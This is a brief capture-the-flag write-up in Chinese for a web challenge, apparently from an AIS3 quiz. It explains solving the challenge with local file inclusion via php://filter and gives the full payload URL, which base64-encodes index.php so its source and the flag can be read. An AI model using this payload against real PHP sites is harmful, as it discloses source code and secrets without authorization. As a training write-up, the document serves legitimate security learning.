## web3
### sol
ref : https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/

可以使用php://filter進行local file inclusion

用 https://quiz.ais3.org:23545/?p=php://filter/convert.base64-encode/resource=index
請求，再將內容用base64 decode即可看到index.php的source，裡面包含flag
